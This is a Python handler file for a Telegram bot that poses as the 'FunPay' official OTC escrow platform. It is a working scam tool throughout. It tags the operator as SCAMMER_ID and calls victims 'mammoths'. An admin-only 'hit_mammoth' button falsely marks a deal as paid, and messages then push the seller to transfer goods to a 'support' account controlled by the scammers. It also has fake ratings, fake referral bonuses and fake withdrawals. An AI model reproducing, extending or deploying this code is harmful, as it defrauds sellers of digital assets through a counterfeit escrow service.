# handlers.py
import logging
import os
from aiogram import Router, F
from aiogram.types import Message, CallbackQuery, FSInputFile
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext

from config import (
    ADMIN_IDS, SCAMMER_ID, SCAMMER_USERNAME,
    SUPPORT_USERNAME, COMMISSION, WELCOME_GIF_PATH,
    ERROR_MESSAGES,
    E_DEAL, E_GRAM, E_STARS, E_HAMMER, E_CHECK,
    E_CROSS, E_BACK, E_SHARE, E_CHART, E_LIST,
    E_USERS, E_SETTINGS, E_PAID, E_WARNING,
    E_PROFILE, E_WITHDRAW, E_CARD, E_GLOBE,
    E_CHAT, E_BANK, E_SUCCESS, E_GROUP,
    E_RU, E_US, E_TR
)
from database import (
    init_db, add_user, get_user, add_requisite, get_requisites,
    delete_requisites, create_deal, get_deal, update_deal_buyer,
    update_deal_paid, update_deal_confirmed, update_deal_completed,
    get_user_deals, update_user_successful_deals, get_all_users,
    get_all_deals, get_deal_count_by_status, get_user_count
)
from keyboards import (
    main_menu, admin_panel, currency_selection, requisite_menu,
    deal_actions, deal_status_buttons, deal_paid_buttons,
    back_button, ok_button, share_deal
)
from states import DealStates, RequisiteStates

router = Router()
logger = logging.getLogger(__name__)

init_db()

def is_admin(user_id):
    return user_id in ADMIN_IDS

def validate_gram(address):
    return address.startswith('UQ') and len(address) >= 30

def format_requisites(reqs):
    if not reqs:
        return "❌ Реквизиты не добавлены"
    lines = []
    for req_type, value in reqs:
        if req_type == "gram":
            lines.append(f"{E_GRAM} GRAM (сеть TON)\nПереведите точную сумму на кошелёк:\n{value}")
        elif req_type == "stars":
            lines.append(f"{E_STARS} Звёзды: {value}")
    return "\n\n".join(lines)

async def send_main_menu(message: Message, user_id: int):
    is_admin_user = is_admin(user_id)

    if os.path.exists(WELCOME_GIF_PATH):
        try:
            gif = FSInputFile(WELCOME_GIF_PATH)
            await message.answer_animation(
                animation=gif,
                caption=f"{E_BANK} FunPay · Официальная OTC-платформа",
                reply_markup=main_menu(is_admin_user)
            )
            return
        except Exception as e:
            logger.error(f"GIF error: {e}")

    if is_admin_user:
        await message.answer(
            f"{E_SETTINGS} Приветствую, воркер!\n\n"
            f"Наши команды:\n"
            f"/buy *код-сделки* – для оплаты сделки\n"
            f"/set_sdel – для установки успешных сделок\n"
            f"/set_ret – для установки рейтинга (в профиле)\n"
            f"/twodeal *юз/айди* – сообщение о второй сделке\n"
            f"/send *текст* *юз/айди* – отправить сообщение\n"
            f"/chat *юз/айди* – выгрузить историю переписки",
            reply_markup=main_menu(is_admin=True)
        )
    else:
        await message.answer(
            f"{E_BANK} FunPay · Официальная OTC-платформа\n\n"
            f"{E_CHECK} Мы предоставляем полностью автоматизированный сервис гаранта\n"
            f"для безопасного обмена цифровыми активами.\n\n"
            f"{E_CHECK} Почему выбирают нас?\n"
            f"• Средства блокируются в блокчейне — прозрачно и безопасно\n"
            f"• Автоматическая проверка оплаты и передачи товара\n"
            f"• Система рейтинга покупателей и продавцов\n"
            f"• Поддержка 24/7\n\n"
            f"{E_CHAT} Поддержка: {SUPPORT_USERNAME}",
            reply_markup=main_menu(is_admin=False)
        )

async def edit_main_menu(callback: CallbackQuery, user_id: int):
    is_admin_user = is_admin(user_id)

    if is_admin_user:
        await callback.message.edit_text(
            f"{E_SETTINGS} Приветствую, воркер!\n\n"
            f"Наши команды:\n"
            f"/buy *код-сделки* – для оплаты сделки\n"
            f"/set_sdel – для установки успешных сделок\n"
            f"/set_ret – для установки рейтинга (в профиле)\n"
            f"/twodeal *юз/айди* – сообщение о второй сделке\n"
            f"/send *текст* *юз/айди* – отправить сообщение\n"
            f"/chat *юз/айди* – выгрузить историю переписки",
            reply_markup=main_menu(is_admin=True)
        )
    else:
        await callback.message.edit_text(
            f"{E_BANK} FunPay · Официальная OTC-платформа\n\n"
            f"{E_CHECK} Мы предоставляем полностью автоматизированный сервис гаранта\n"
            f"для безопасного обмена цифровыми активами.\n\n"
            f"{E_CHECK} Почему выбирают нас?\n"
            f"• Средства блокируются в блокчейне — прозрачно и безопасно\n"
            f"• Автоматическая проверка оплаты и передачи товара\n"
            f"• Система рейтинга покупателей и продавцов\n"
            f"• Поддержка 24/7\n\n"
            f"{E_CHAT} Поддержка: {SUPPORT_USERNAME}",
            reply_markup=main_menu(is_admin=False)
        )

# ============ КОМАНДЫ ============

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()

    user_id = message.from_user.id
    username = message.from_user.username or "Нет юзернейма"
    full_name = message.from_user.full_name

    add_user(user_id, username, full_name)

    args = message.text.split()
    if len(args) > 1:
        param = args[1].strip()

        if not param.startswith("ref_"):
            deal_code = param
            deal = get_deal(deal_code)

            if deal and deal[6] not in ['paid', 'confirmed', 'completed']:
                update_deal_buyer(deal_code, user_id)

                reqs = get_requisites(deal[1])
                req_text = format_requisites(reqs)

                await message.answer(
                    f"{E_DEAL} Сделка #{deal_code}:\n"
                    f"Сумма: {deal[4]}\n"
                    f"Описание: {deal[5]}\n"
                    f"Комиссия: {COMMISSION}%\n\n"
                    f"Реквизиты для оплаты:\n"
                    f"{req_text}\n\n"
                    f"После успешной оплаты статус сделки изменится, и продавец получит уведомление о вашей успешной оплате!",
                    reply_markup=deal_status_buttons(deal_code, is_seller=False)
                )

                user = get_user(user_id)
                deals_count = user[3] if user else 0

                await message.bot.send_message(
                    SCAMMER_ID,
                    f"{E_WARNING} @{username} ({user_id}) присоединился к сделке #{deal_code}!\n"
                    f"Успешных сделок: {deals_count}\n\n"
                    f"{E_WARNING} Не передавайте товар на {SUPPORT_USERNAME}, пока бот не уведомит покупателя об оплате!"
                )
                return

    await send_main_menu(message, user_id)

@router.message(Command("buy"))
async def cmd_buy(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer(ERROR_MESSAGES["access_denied"])
        return

    args = message.text.split()
    if len(args) < 2:
        await message.answer(f"{E_CROSS} Используйте: /buy #код-сделки")
        return

    deal_code = args[1].replace('#', '')
    deal = get_deal(deal_code)

    if not deal:
        await message.answer(ERROR_MESSAGES["deal_not_found"])
        return

    if deal[6] != 'joined':
        await message.answer(ERROR_MESSAGES["deal_not_joined"])
        return

    buyer_id = deal[3]
    buyer = get_user(buyer_id)
    buyer_username = buyer[1] if buyer else "Неизвестно"

    await message.answer(
        f"{E_WARNING} Вы уверены что хотите провести оплату по сделке #{deal_code}?\n\n"
        f"Мамонт: @{buyer_username} ({buyer_id})\n"
        f"Сумма: {deal[4]}\n"
        f"Описание: {deal[5]}",
        reply_markup=deal_paid_buttons(deal_code)
    )

# ============ ВСЕ КОЛБЭКИ ДЛЯ КНОПОК ============

@router.callback_query(F.data == "back_to_main")
async def back_to_main(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await edit_main_menu(callback, callback.from_user.id)
    await callback.answer()

@router.callback_query(F.data == "admin_panel")
async def admin_panel_callback(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    await callback.message.edit_text(
        f"{E_SETTINGS} Админ-панель\n\nВыберите действие:",
        reply_markup=admin_panel()
    )
    await callback.answer()

@router.callback_query(F.data == "admin_stats")
async def admin_stats(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    user_count = get_user_count()
    deals = get_all_deals()
    stats = get_deal_count_by_status()

    text = f"{E_CHART} Статистика\n\n"
    text += f"{E_USERS} Всего пользователей: {user_count}\n"
    text += f"{E_LIST} Всего сделок: {len(deals)}\n\n"
    text += f"Статусы:\n"
    for status, count in stats:
        emoji = {'created': '🟡', 'joined': '🔵', 'paid': '🟣', 'confirmed': '🟠', 'completed': E_SUCCESS}.get(status, '⚪')
        text += f"{emoji} {status}: {count}\n"

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_deals")
async def admin_deals(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    deals = get_all_deals()[:10]

    if not deals:
        text = f"{E_LIST} Нет сделок"
    else:
        text = f"{E_LIST} Последние 10 сделок:\n\n"
        for deal in deals:
            text += f"#{deal[0]} | {deal[4]} | {deal[6]}\n"

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "admin_users")
async def admin_users(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    users = get_all_users()[:10]

    if not users:
        text = f"{E_USERS} Нет пользователей"
    else:
        text = f"{E_USERS} Последние 10 пользователей:\n\n"
        for user in users:
            text += f"@{user[1]} | Сделок: {user[3]} | Рейтинг: {user[4]}\n"

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "create_deal")
async def create_deal_start(callback: CallbackQuery, state: FSMContext):
    user_id = callback.from_user.id
    reqs = get_requisites(user_id)

    if not reqs:
        await callback.message.edit_text(
            ERROR_MESSAGES["no_requisites"],
            reply_markup=ok_button()
        )
        await callback.answer()
        return

    await callback.message.edit_text(
        f"{E_DEAL} Выберите валюту сделки:",
        reply_markup=currency_selection()
    )
    await state.set_state(DealStates.waiting_currency)
    await callback.answer()

@router.callback_query(F.data.startswith("currency_"))
async def select_currency(callback: CallbackQuery, state: FSMContext):
    currency = callback.data.replace("currency_", "")
    currency_names = {"gram": "GRAM", "stars": "Звёзды"}

    await state.update_data(currency=currency_names[currency])
    await callback.message.edit_text(
        f"{E_WARNING} Введите сумму сделки:",
        reply_markup=back_button()
    )
    await state.set_state(DealStates.waiting_amount)
    await callback.answer()

@router.message(DealStates.waiting_amount)
async def process_amount(message: Message, state: FSMContext):
    try:
        amount = float(message.text.replace(',', '.'))
        if amount <= 0:
            raise ValueError
    except:
        await message.answer(ERROR_MESSAGES["invalid_amount"])
        return

    await state.update_data(amount=amount)
    data = await state.get_data()
    currency = data.get('currency', 'GRAM')

    await message.answer(
        f"{E_DEAL} Что вы предлагаете за {amount} {currency}?",
        reply_markup=back_button()
    )
    await state.set_state(DealStates.waiting_description)

@router.message(DealStates.waiting_description)
async def process_description(message: Message, state: FSMContext):
    description = message.text
    if len(description) > 200:
        await message.answer(ERROR_MESSAGES["description_too_long"])
        return

    data = await state.get_data()
    currency = data.get('currency', 'GRAM')
    amount = data.get('amount', 0)

    user_id = message.from_user.id
    bot_username = (await message.bot.get_me()).username

    deal_code = create_deal(user_id, currency, amount, description)
    deal_link = f"https://t.me/{bot_username}?start={deal_code}"

    await state.clear()

    await message.answer(
        f"{E_SUCCESS} Сделка создана!\n\n"
        f"Номер сделки: #{deal_code}\n"
        f"Сумма: {amount}\n"
        f"Описание: {description}\n\n"
        f"Ссылка для покупателя:\n{deal_link}\n\n"
        f"Отправьте эту ссылку покупателю для совершения оплаты!",
        reply_markup=deal_actions(deal_code)
    )

@router.callback_query(F.data.startswith("share_"))
async def share_deal_link(callback: CallbackQuery):
    deal_code = callback.data.replace("share_", "")
    deal = get_deal(deal_code)

    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return

    bot_username = (await callback.bot.get_me()).username
    deal_link = f"https://t.me/{bot_username}?start={deal_code}"

    await callback.message.answer(
        f"{E_SHARE} Ссылка для покупателя:\n{deal_link}",
        reply_markup=share_deal(deal_code, deal_link)
    )
    await callback.answer()

@router.callback_query(F.data.startswith("cancel_deal_"))
async def cancel_deal(callback: CallbackQuery, state: FSMContext):
    await back_to_main(callback, state)
    await callback.answer(f"{E_CROSS} Сделка отменена")

@router.callback_query(F.data == "requisites")
async def requisites_menu(callback: CallbackQuery):
    user_id = callback.from_user.id
    reqs = get_requisites(user_id)

    text = f"{E_CARD} Ваши реквизиты:\n\n"
    if reqs:
        for req_type, value in reqs:
            text += f"• {req_type.upper()}: {value}\n"
    else:
        text += f"{E_CROSS} Реквизиты не добавлены\n\n"

    text += f"\n{E_DEAL} Выберите действие:"

    await callback.message.edit_text(text, reply_markup=requisite_menu())
    await callback.answer()

@router.callback_query(F.data == "add_gram")
async def add_gram_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text(
        f"{E_WARNING} Укажите адрес кошелька GRAM:",
        reply_markup=back_button()
    )
    await state.set_state(RequisiteStates.waiting_gram)
    await callback.answer()

@router.message(RequisiteStates.waiting_gram)
async def process_gram(message: Message, state: FSMContext):
    address = message.text.strip()

    if not validate_gram(address):
        await message.answer(
            ERROR_MESSAGES["invalid_gram"],
            reply_markup=back_button()
        )
        return

    user_id = message.from_user.id
    add_requisite(user_id, "gram", address)

    await state.clear()
    await message.answer(
        f"{E_SUCCESS} Кошелёк GRAM успешно добавлен!",
        reply_markup=back_button()
    )

@router.callback_query(F.data == "delete_requisites")
async def delete_requisites_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    delete_requisites(user_id)

    await callback.message.edit_text(
        f"{E_SUCCESS} Все реквизиты удалены!",
        reply_markup=back_button()
    )
    await callback.answer()

@router.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    user = get_user(user_id)

    if not user:
        await callback.answer(f"{E_CROSS} Пользователь не найден", show_alert=True)
        return

    deals = get_user_deals(user_id)
    completed = [d for d in deals if d[6] == 'completed']

    text = f"{E_PROFILE} Профиль\n\n"
    text += f"🆔 ID: {user[0]}\n"
    text += f"{E_PROFILE} Юзернейм: @{user[1]}\n"
    text += f"📝 Имя: {user[2]}\n"
    text += f"{E_SUCCESS} Успешных сделок: {user[3]}\n"
    text += f"⭐ Рейтинг: {user[4]}\n"
    text += f"{E_LIST} Всего сделок: {len(deals)}\n"
    text += f"{E_SUCCESS} Завершено: {len(completed)}"

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "withdraw")
async def withdraw_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    reqs = get_requisites(user_id)

    if not reqs:
        await callback.message.edit_text(
            f"{E_CROSS} У вас нет реквизитов для вывода!\n\nДобавьте реквизиты в меню 'Реквизиты'",
            reply_markup=back_button()
        )
        await callback.answer()
        return

    text = f"{E_WITHDRAW} Вывод средств\n\n"
    text += "Ваши реквизиты для вывода:\n"
    for req_type, value in reqs:
        text += f"• {req_type.upper()}: {value}\n"
    text += f"\n{E_CHAT} Для вывода обратитесь в поддержку: {SUPPORT_USERNAME}"

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "referrals")
async def referrals_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    bot_username = (await callback.bot.get_me()).username

    text = f"{E_GROUP} Реферальная система\n\n"
    text += "Приглашайте друзей и получайте бонусы!\n"
    text += f"Ваша реферальная ссылка:\n"
    text += f"https://t.me/{bot_username}?start=ref_{user_id}\n\n"
    text += "За каждого приглашённого друга вы получаете 5% от его сделок!"

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

@router.callback_query(F.data == "language")
async def language_callback(callback: CallbackQuery):
    text = f"{E_GLOBE} Выберите язык:\n\n"
    text += f"{E_RU} Русский\n"
    text += f"{E_US} English\n"
    text += f"{E_TR} Türkçe"

    await callback.message.edit_text(text, reply_markup=back_button())
    await callback.answer()

# ============ ОПЛАТА ============

@router.callback_query(F.data.startswith("hit_mammoth_"))
async def hit_mammoth(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    deal_code = callback.data.replace("hit_mammoth_", "")
    deal = get_deal(deal_code)

    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return

    update_deal_paid(deal_code)

    await callback.message.edit_text(
        f"{E_SUCCESS} Оплата по сделке #{deal_code} успешно получена!\nПродавец получил уведомление"
    )

    await callback.message.answer(
        f"{E_DEAL} Сделка #{deal_code}:\n"
        f"Сумма: {deal[4]}\n"
        f"Описание: {deal[5]}\n"
        f"Комиссия: {COMMISSION}%\n\n"
        f"{E_PAID} Статус сделки: покупатель успешно оплатил\n\n"
        f"{E_WARNING} Дождитесь, пока продавец передаст товар на аккаунт {SUPPORT_USERNAME}, а затем подтвердите это в боте!"
    )

    await callback.message.answer(
        f"{E_DEAL} Сделка #{deal_code}:\n"
        f"Сумма: {deal[4]}\n"
        f"Описание: {deal[5]}\n"
        f"Комиссия: {COMMISSION}%\n\n"
        f"{E_PAID} Статус сделки: покупатель успешно оплатил\n"
        f"👇ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО👇\n"
        f"‼️{SUPPORT_USERNAME}‼️\n"
        f"☝️ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО☝️\n\n"
        f"В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату. Рекомендуем записывать экран во время передачи товара."
    )

    buyer_id = deal[3]
    try:
        await callback.bot.send_message(
            buyer_id,
            f"{E_SUCCESS} Оплата по сделке #{deal_code} успешно получена!\nПродавец получил уведомление"
        )
        await callback.bot.send_message(
            buyer_id,
            f"{E_DEAL} Сделка #{deal_code}:\n"
            f"Сумма: {deal[4]}\n"
            f"Описание: {deal[5]}\n"
            f"Комиссия: {COMMISSION}%\n\n"
            f"{E_PAID} Статус сделки: покупатель успешно оплатил\n"
            f"👇ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО👇\n"
            f"‼️{SUPPORT_USERNAME}‼️\n"
            f"☝️ПЕРЕДАВАЙТЕ ТОВАР ТОЛЬКО☝️\n\n"
            f"В противном случае покупатель не сможет подтвердить получение товара, а вы не сможете получить оплату. Рекомендуем записывать экран во время передачи товара.",
            reply_markup=deal_status_buttons(deal_code, is_seller=True)
        )
    except:
        pass

    await callback.answer(f"{E_SUCCESS} Оплата подтверждена!")

@router.callback_query(F.data.startswith("confirm_deal_"))
async def confirm_deal(callback: CallbackQuery):
    deal_code = callback.data.replace("confirm_deal_", "")
    deal = get_deal(deal_code)

    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return

    update_deal_confirmed(deal_code)

    await callback.message.edit_text(
        f"{E_DEAL} Сделка #{deal_code}:\n"
        f"Сумма: {deal[4]}\n"
        f"Описание: {deal[5]}\n"
        f"Комиссия: {COMMISSION}%\n\n"
        f"{E_PAID} Статус сделки: покупатель успешно оплатил, продавец подтвердил передачу товара\n\n"
        f"{E_WARNING} Ожидайте проверки покупателем и подтверждения перевода на аккаунт {SUPPORT_USERNAME}. Если товар не был передан на {SUPPORT_USERNAME}, покупатель не сможет подтвердить получение, а вы не получите оплату!",
        reply_markup=deal_status_buttons(deal_code, is_seller=False)
    )

    await callback.bot.send_message(
        SCAMMER_ID,
        f"{E_DEAL} Сделка #{deal_code}:\n"
        f"Сумма: {deal[4]}\n"
        f"Описание: {deal[5]}\n"
        f"Комиссия: {COMMISSION}%\n\n"
        f"{E_PAID} Статус сделки: покупатель оплатил, продавец подтвердил передачу товара\n\n"
        f"{E_WARNING} Проверьте передачу товара на {SUPPORT_USERNAME} и подтвердите это в системе бота. После подтверждения оплата будет безвозвратно отправлена продавцу, а товар — отправлен вам!",
        reply_markup=deal_status_buttons(deal_code, is_seller=True)
    )

    await callback.answer()

@router.callback_query(F.data.startswith("confirm_deal_seller_"))
async def confirm_deal_seller(callback: CallbackQuery):
    if not is_admin(callback.from_user.id):
        await callback.answer(ERROR_MESSAGES["access_denied"], show_alert=True)
        return

    deal_code = callback.data.replace("confirm_deal_seller_", "")
    deal = get_deal(deal_code)

    if not deal:
        await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
        return

    update_deal_completed(deal_code)
    update_user_successful_deals(deal[1])
    if deal[3]:
        update_user_successful_deals(deal[3])

    buyer_id = deal[3]

    await callback.message.edit_text(
        f"{E_DEAL} Сделка #{deal_code}:\n"
        f"Сумма: {deal[4]}\n"
        f"Описание: {deal[5]}\n"
        f"Комиссия: {COMMISSION}%\n\n"
        f"{E_PAID} Статус сделки: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА\n\n"
        f"{E_SUCCESS} Пожалуйста, дождитесь поступления товара на ваш аккаунт!"
    )

    try:
        await callback.bot.send_message(
            buyer_id,
            f"{E_DEAL} Сделка #{deal_code}:\n"
            f"Сумма: {deal[4]}\n"
            f"Описание: {deal[5]}\n"
            f"Комиссия: {COMMISSION}%\n\n"
            f"{E_PAID} Статус сделки: СДЕЛКА УСПЕШНО ЗАВЕРШЕНА\n\n"
            f"Ожидайте поступления оплаты на указанный вами ранее кошелёк!"
        )
    except:
        pass

    await callback.answer(f"{E_SUCCESS} Сделка завершена!")

# ============ ОБРАБОТЧИК НЕИЗВЕСТНЫХ КОЛБЭКОВ ============

@router.callback_query()
async def catch_all_callbacks(callback: CallbackQuery):
    """Ловит все нажатия, которые не обработаны выше"""
    await callback.answer(f"{E_WARNING} Команда в разработке...")
    await callback.message.answer(
        f"{E_CROSS} Неизвестная команда.\nИспользуйте /start для начала работы.",
        reply_markup=back_button()
    )

@router.message()
async def handle_unknown(message: Message):
    await message.answer(
        f"{E_CROSS} Неизвестная команда.\nИспользуйте /start для начала работы."
    )